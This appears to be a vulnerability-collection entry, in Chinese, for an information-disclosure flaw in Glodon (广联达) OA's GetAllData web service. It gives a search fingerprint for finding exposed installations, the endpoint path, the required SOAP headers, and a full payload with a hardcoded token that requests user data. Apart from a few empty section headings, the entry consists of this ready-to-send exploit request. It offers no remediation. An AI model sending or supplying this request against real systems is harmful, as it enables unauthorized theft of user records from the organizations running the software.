# 广联达OAGetAllData存在信息漏洞

- **系统**：广联达　|　**类型**：其他　|　**CVE**：—
- **指纹**：`app.name="广联达 OA"`
- **请求**：`POST /WebService/Lk6SyncService/MrMMSSvc/DataSvc.asmx HTTP/1.1`
- **关键头**：`SOAPAction: http://tempuri.org/GetAllData`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 379`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:GetAllData>
<!--type: string-->
<tem:Token>!@#$asdf$#@!</tem:Token>
<!--type: string-->
<tem:DataType>user</tem:DataType>
</tem:GetAllData>
</soapenv:Body>
</soapenv:Envelope>
>
```

**其他**
- 广联达OA GetAllData 存在信息漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + 广联达办公OA